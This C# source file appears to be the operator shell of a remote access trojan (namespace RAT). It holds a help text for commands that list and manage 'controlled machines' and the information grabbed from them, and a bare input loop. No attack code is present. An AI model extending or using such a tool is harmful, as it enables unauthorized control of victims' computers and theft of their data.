using RAT.Utils;

namespace RAT.Shell;

static class Shell
{
    private static bool isShellOpened = true;

    internal static void TurnShell()
    {
        string help =
            $@"
Shell usage: $ command <option> |

List of available command and their options: 

1. BASE HANDLING WITH SHELL:

------------
$ (menu) - Open main menu of RAT with all important commands;
------------
$ (clear/cls) - Clear terminal;
------------
$ (exit/quit) - Close program;
------------

2. WORK WITH TARGETS:

------------
$ (machine) <option> - Handling with controlled machine;
OPTIONS: 
--list / -l : List of controlled machines with all information that was grabbed from;
--info / -i <id1,id2,id3...> : Show all information about specific machines, you can use this option with more than 1 param, Example: session --info 537290 | That command show us all information about [537290] machine;
--rename / -rn <id> : Rename specific one machine,  
--delete / -d <id> : Delete controlling machine.  {(UtilsCollection.isAdmin ? "For using this param, you have to execute utility with admin rights." : "")};

";
        while (isShellOpened)
        {
            Console.Write($"[{UtilsCollection.machineName}@{UtilsCollection.userName}]$ ");
            string? input = Console.ReadLine();

            if (string.IsNullOrEmpty(input))
            {
                Console.WriteLine("There's command `help` shows all commands and their options.");
                continue;
            }
        }
    }
}
